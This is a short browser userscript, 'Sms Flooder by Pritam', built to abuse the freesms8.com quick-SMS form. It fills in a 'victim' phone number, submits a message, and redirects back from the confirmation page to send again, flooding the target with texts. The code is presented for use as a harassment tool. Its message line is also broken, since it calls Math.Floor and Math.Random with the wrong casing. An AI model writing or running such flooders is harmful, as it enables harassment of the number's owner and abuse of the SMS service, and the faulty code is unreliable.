// ==UserScript==
// @name           Sms Flooder by Pritam
// @namespace      Pritam
// @description    SMS Flooder
// @include        http://*freesms8.com/*
// ==/UserScript==

var victim=0 //Enter victims number here


if(document.location=="http://www.freesms8.com/QuickSMS.aspx")


{

document.getElementById('ctl00_BodyPlaceHolder_MobileNumber').value=victim;

document.getElementById('ctl00_BodyPlaceHolder_SMSText').value="hi"+Math.Floor(Math.Random()

*34);

document.getElementById('ctl00_BodyPlaceHolder_SendButton').click();



}
if(document.location=="http://www.freesms8.com/QuickSent.aspx")
{

//   alert("You will be redirected to our main page in 10 seconds!");
  // setTimeout('getgoing()',1000);
   window.location="http://www.freesms8.com/QuickSMS.aspx";
   

}